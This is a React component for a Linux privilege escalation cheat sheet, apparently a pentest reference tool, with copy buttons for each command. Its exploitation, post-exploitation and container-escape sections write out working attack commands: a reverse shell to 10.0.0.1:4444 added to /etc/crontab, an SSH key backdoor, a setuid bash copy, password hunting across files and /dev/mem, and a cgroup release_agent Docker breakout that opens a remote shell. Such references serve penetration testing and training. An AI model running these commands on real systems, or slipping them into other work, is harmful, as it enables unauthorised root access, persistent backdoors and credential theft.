import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaTerminal, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const LinuxPrivEsc = () => {
  const [expandedSection, setExpandedSection] = useState('enumeration');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: 'Guided Privilege Escalation Walkthrough',
      content: [
        {
          type: 'markdown',
          value: `Follow this step-by-step chain to escalate privileges on a Linux system. Expand each step for details and commands.`
        },
        {
          type: 'step',
          title: '1. System & User Recon',
          description: 'Gather basic system and user info to identify potential attack vectors.',
          commands: [
            { value: 'uname -a', description: 'Kernel version and architecture' },
            { value: 'id', description: 'Current user and groups' },
            { value: 'sudo -l', description: 'Check sudo privileges' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** After each step, re-check your privileges with `id` and `whoami`. Document your findings!'
        },
        {
          type: 'step',
          title: '2. Find SUID/SGID Binaries',
          description: 'Look for binaries with elevated privileges that can be exploited.',
          commands: [
            { value: 'find / -perm -u=s -type f 2>/dev/null', description: 'Find SUID binaries' },
            { value: 'find / -perm -g=s -type f 2>/dev/null', description: 'Find SGID binaries' }
          ]
        },
        {
          type: 'step',
          title: '3. Check for Writable Files & Misconfigs',
          description: 'Identify files and configs that can be abused for privilege escalation.',
          commands: [
            { value: 'find / -writable -type d 2>/dev/null', description: 'World-writable directories' },
            { value: 'ls -l /etc/passwd', description: 'Check if /etc/passwd is writable' }
          ]
        },
        {
          type: 'step',
          title: '4. Kernel Exploit Check',
          description: 'Determine if the kernel is vulnerable to public exploits.',
          commands: [
            { value: 'uname -r', description: 'Get kernel version' },
            { value: 'searchsploit kernel <version>', description: 'Search for kernel exploits' }
          ]
        },
        {
          type: 'step',
          title: '5. Exploit & Escalate',
          description: 'Use a discovered vector to gain root. Example: Exploit a writable SUID binary or kernel vuln.',
          commands: [
            { value: './exploit', description: 'Run exploit (replace with actual exploit binary)' }
          ]
        }
      ]
    },
    {
      id: 'enumeration',
      title: 'System Enumeration',
      content: [
        {
          type: 'markdown',
          value: `#### Basic System Info\nUse these to get a quick overview of the system:`
        },
        { type: 'command', value: 'uname -a', description: 'Kernel version and system architecture' },
        { type: 'command', value: 'cat /etc/*-release', description: 'Distribution version information' },
        { type: 'command', value: 'hostnamectl', description: 'Hostname and OS details' },
        { type: 'command', value: 'lscpu', description: 'CPU architecture information' },
        { type: 'command', value: 'lsblk -f', description: 'Block devices and filesystems' },
        { type: 'command', value: 'df -h', description: 'Disk space usage' },
        {
          type: 'markdown',
          value: `#### User & Privilege Info\nFind out who you are and what you can do:`
        },
        { type: 'command', value: 'id', description: 'Current user and groups' },
        { type: 'command', value: 'whoami', description: 'Current username' },
        { type: 'command', value: 'sudo -l', description: 'List sudo privileges (try without password)' },
        { type: 'command', value: 'groups', description: 'Groups for current user' },
        {
          type: 'markdown',
          value: `#### Interesting Files & Permissions\nLook for sensitive files and misconfigurations:`
        },
        { type: 'command', value: 'find / -type f -name "*.bak" -o -name "*.old" -o -name "*.swp" 2>/dev/null', description: 'Find backup, old, and swap files (may contain creds)' },
        { type: 'command', value: 'find / -writable -type d 2>/dev/null', description: 'Find world-writable directories' },
        { type: 'command', value: 'find / -perm -u=s -type f 2>/dev/null', description: 'Find all SUID binaries (potential privesc)' },
        { type: 'command', value: 'getcap -r / 2>/dev/null', description: 'Find files with Linux capabilities set' },
        {
          type: 'markdown',
          value: `#### Advanced Enumeration\nDeeper checks for privilege escalation vectors:`
        },
        { type: 'command', value: 'ps auxfww', description: 'Detailed process tree' },
        { type: 'command', value: 'ss -tulnp', description: 'All listening ports with processes' },
        { type: 'command', value: 'ls -la /etc/cron* /var/spool/cron/crontabs', description: 'List cron jobs' },
        { type: 'command', value: 'systemctl list-units --type=service --state=running', description: 'Running services' },
        { type: 'command', value: 'grep -iE "docker|lxc" /proc/1/cgroup', description: 'Check for Docker/LXC/containerization' },
        { type: 'command', value: 'find / -perm /6000 -type f 2>/dev/null', description: 'Unusual setuid/setgid files' },
        { type: 'command', value: 'ls -l /etc/passwd', description: 'Check if /etc/passwd is writable' },
        {
          type: 'markdown',
          value: `**Tip:** Use [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) or [LES](https://github.com/mzet-/linux-exploit-suggester) for automated enumeration.`
        }
      ]
    },
    {
      id: 'exploitation',
      title: 'Exploitation Techniques',
      content: [
        {
          type: 'markdown',
          value: `### SUID Binaries
\`\`\`bash
find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null
# Exploit known SUID binaries (GTFOBins)
./binary -payload 'chmod +s /bin/bash'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Capabilities Abuse
\`\`\`bash
# If python has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Dirty Pipe (CVE-2022-0847)
\`\`\`bash
gcc -o exploit exploit.c && ./exploit /usr/bin/su
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Kernel Exploits
\`\`\`bash
# Check kernel version
uname -r
# Search for exploits
searchsploit kernel 5.4.0
# Compile and run
gcc exploit.c -o exploit -static && ./exploit
\`\`\``
        }
      ]
    },
    {
      id: 'post-exploitation',
      title: 'Post-Exploitation',
      content: [
        {
          type: 'markdown',
          value: `### Persistence Methods
\`\`\`bash
# Cron job
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" >> /etc/crontab
# SSH backdoor
echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys
# Systemd service
cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Password Hunting
\`\`\`bash
# Find passwords in files
grep -riE 'password|passwd|pwd|credential' / 2>/dev/null
# Check history files
cat ~/.bash_history ~/.zsh_history
# Extract passwords from memory (needs root)
strings /dev/mem | grep -i pass
\`\`\``
        }
      ]
    },
    {
      id: 'containers',
      title: 'Container Escapes',
      content: [
        {
          type: 'markdown',
         value: `### Docker Breakout
\`\`\`bash
# Check if in container
cat /proc/1/cgroup | grep -qi docker && echo "In container"
# Exploit if privileged
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# SYS_ADMIN capability
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=\\\`sed -n 's/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p' /etc/mtab\\\`
echo "\\\${host_path}/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" >> /cmd
chmod +x /cmd
sh -c "echo \\\$\\\$ > /tmp/cgrp/x/cgroup.procs"
\`\`\``

        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaTerminal /> Linux Privilege Escalation Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive Linux privilege escalation techniques covering enumeration, 
          exploitation, post-exploitation, and container escapes.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'command') {
                      return (
                        <div key={index} className="content-item">
                          <div className="command-item">
                            <div className="command-header">
                              <code>{item.value}</code>
                              <button
                                onClick={() => handleCopy(item.value)}
                                className="copy-button small"
                              >
                                Copy
                              </button>
                            </div>
                            <p className="command-description">{item.description}</p>
                          </div>
                        </div>
                      );
                    } else if (item.type === 'markdown') {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>
                              {item.value}
                            </ReactMarkdown>
                          </div>
                        </div>
                      );
                    } else if (item.type === 'step') {
                      // Render step with title, description, and commands
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header">
                            <strong>{item.title}</strong>
                          </div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button
                                    onClick={() => handleCopy(cmd.value)}
                                    className="copy-button small"
                                  >
                                    Copy
                                  </button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else {
                      return null;
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default LinuxPrivEsc;